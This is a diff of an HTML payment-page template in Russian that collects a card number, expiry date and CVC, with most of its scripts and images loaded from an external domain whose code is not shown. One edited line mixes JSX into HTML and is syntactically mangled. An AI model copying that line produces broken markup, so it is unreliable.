@@ -15,22 +15,20 @@
     <link rel="apple-touch-icon" sizes="144x144" href="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/img/favicon/apple-icon-144x144.png">
     <link rel="apple-touch-icon" sizes="152x152" href="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/img/favicon/apple-icon-152x152.png">
     <link rel="apple-touch-icon" sizes="180x180" href="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/img/favicon/apple-icon-180x180.png">
-    <link rel="icon" type="image/png" sizes="192x192"  href="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/img/favicon/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/img/favicon/android-icon-192x192.png">
     <link rel="icon" type="image/png" sizes="32x32" href="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/img/favicon/favicon-32x32.png">
     <link rel="icon" type="image/png" sizes="96x96" href="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/img/favicon/favicon-96x96.png">
     <link rel="icon" type="image/png" sizes="16x16" href="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/img/favicon/favicon-16x16.png">
     <link rel="manifest" href="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/img/favicon/manifest.json">
     <meta name="msapplication-TileColor" content="#ffffff">
     <meta name="msapplication-TileImage" content="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/img/favicon/ms-icon-144x144.png">
-    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="/6a6a912d0c7b55b537768da778032849.css">
 
-    <script>
-        var ClientRootURL = "#clientRootURL#";
-        var Nonce = "#nonce#";
-        var SessionID = "#sessionID#";
-        var PageMode = "#pageMode#";
-        var MaskedPAN = "#maskedPAN#";
-    </script>
+    <script>var ClientRootURL = "#clientRootURL#";
+var Nonce = "#nonce#";
+var SessionID = "#sessionID#";
+var PageMode = "#pageMode#";
+var MaskedPAN = "#maskedPAN#";</script>
 
 </head>
 <body>
@@ -39,7 +37,7 @@
             <div class="wrapper__head">
               <div class="d-flex flex-column flex-sm-row align-items-center justify-content-between w-100">
                 <a href="/">
-                  <img src="./img/logo.png" width="105" alt="logo">
+                  <img src="/bc73d7effd7675f355ff736ececc779a.png" width="105" alt="logo">
                 </a>
                 <div class="d-flex align-items-center ml-sm-3">
                   <img src="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/img/shield.svg" width="20" alt="">
@@ -56,26 +54,18 @@
               <form class="form d-flex flex-column">
                 <div class="card-form d-flex flex-column position-relative">
                   <div class="d-flex justify-content-end">
-                    <img id="cardLogo" src=img/card/default.svg height="42" width="80" />
+                    <img id="cardLogo" src="/cd117e8b1e7f4a54da0b1f10ef5f6f56.svg" height="42" width="80">
                   </div>
                   <label htmlFor="pan" class="text-default font-14 mb-1">Номер карты</label>
                   <div class="position-relative">
-                    <input
-                      id="pan"
-                      type="tel"
-                      name="cardnumber"
-                      class="out-none text-default font-weight-bold w-100 border-0 card-text-input shadow-inset-white mb-3 p-1"
-                      autoComplete="cc-number"
-                      autocompletetype="cc-number"
-                      x-autocompletetype="cc-number"
-                      placeholder="____ ____ ____ ____"
+                    <InputMask id="pan" type="tel" name="cardnumber" mask="{cardMask}" onInput="{this.validateNumber}" onBlur="{this.validateLuhn}" class="out-none myriad text-default font-weight-bold w-100 border-0 card-text-input shadow-inset-white mb-3 p-1" autoComplete="cc-number" autocompletetype="cc-number" x-autocompletetype="cc-number" placeholder="____ ____ ____ ____" value="{card}" onChange="{e" ==""> this.setState({ card: e.target.value })}
                     />
                     {errorNumber && (
                     <div class="error-number position-absolute text-danger font-11 font-weight-bold ">
                       Неверный номер карты
                     </div>
                     )}
-                  </div>
+                  </InputMask></div>
                   
                        <div class="form-group">
                            <span class="form-group__label">Номер карты плательщика</span>
@@ -87,37 +77,37 @@
                        <div class="form-group form-group--date">
                            <span class="form-group__label">Срок действия</span>
                            <div class="date">
-                               <input onkeypress='return event.charCode >= 48 && event.charCode <= 57' type="tel" class="form__control expInput" id="exp" placeholder="ММ / ГГ" autocomplete="off" maxlength="5">
+                               <input onkeypress="return event.charCode >= 48 && event.charCode <= 57" type="tel" class="form__control expInput" id="exp" placeholder="ММ / ГГ" autocomplete="off" maxlength="5">
                            </div>
                        </div>
                        <div class="form-group cvv">
                            <span class="form-group__label cvv__mob-label">Код</span>
-                           <input onkeypress='return event.charCode >= 48 && event.charCode <= 57'  type="tel" class="form__control cvcInput" id="cvc" placeholder="000" autocomplete="off">
+                           <input onkeypress="return event.charCode >= 48 && event.charCode <= 57" type="tel" class="form__control cvcInput" id="cvc" placeholder="000" autocomplete="off">
                            <span class="form-group__label">3 цифры <br>на обороте</span>
                        </div>
                         <img src="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/img/alllogo.svg" class="card-logos" alt="">
                    </div>
-                   <div class = "load-card-block">
-                       <div class = "save-card"><span class = "save-text">Сохранить карту</span>
+                   <div class="load-card-block">
+                       <div class="save-card"><span class="save-text">Сохранить карту</span>
 
-                        <input type="checkbox" id="cardTokenization" name = "saveCard" value="1">
+                        <input type="checkbox" id="cardTokenization" name="saveCard" value="1">
                         <label for="cardTokenization" class="check">
                         <svg width="18px" height="18px" viewBox="0 0 18 18">
                             <path d="M1,9 L1,3.5 C1,2 2,1 3.5,1 L14.5,1 C16,1 17,2 17,3.5 L17,14.5 C17,16 16,17 14.5,17 L3.5,17 C2,17 1,16 1,14.5 L1,9 Z"></path>
                             <polyline points="1 9 7 14 15 4"></polyline>
                         </svg>
                         </label>
-                        <button class="tooltip" type = "button"></button>
+                        <button class="tooltip" type="button"></button>
                        </div>
                    </div>
-                   <div class = "iosHoverMobele">Вы можете сохранить эту карту для дальнейших покупок. Продавец не будет иметь доступа к этим данным, а каждый платеж мы будем подтверждать вводом кода. Никто не сможет списать деньги с карты без вашего желания</div>
+                   <div class="iosHoverMobele">Вы можете сохранить эту карту для дальнейших покупок. Продавец не будет иметь доступа к этим данным, а каждый платеж мы будем подтверждать вводом кода. Никто не сможет списать деньги с карты без вашего желания</div>
                    <p class="pay-for">#description#</p>
                    <div class="form-group form-group__price">
                        <span class="form-group__label">Сумма к оплате</span>
                        <p class="price">#amount# ₽</p>
                    </div>
-                   <div class = loadingBlock>
-                       <div class = "loadingText">
+                   <div class="loadingBlock">
+                       <div class="loadingText">
                            Обработка платежа
                        </div>
                        <div class="windows8">
@@ -155,13 +145,13 @@
         <input type="hidden" id="termURL" name="TermUrl" value="#clientRootURL#confirm/?inData=request&nonce=#nonce3DS#&sessionID=#sessionID#">
     </form>
 
-    <script
-      src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
-    <script src="js/inputmask-5/jquery.inputmask.min.js"></script>
-    <script src="js/script.js"></script>
+    <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+    <script src="/d7132405f87d054441d2e65ea4cf662f.js"></script>
+
     
     
 
+    <script src="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/js/jquery.maskedinput.min.js"></script>
     <script src="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/js/app.js"></script>
     <script src="https://kit.fontawesome.com/19a0dafb10.js"></script>
     <script src="https://api2.api8pc.ru/8bb147f89c1023ce0cb0391fdbe7faa37cb2fb0e/html/js/jquery.base64.min.js"></script>
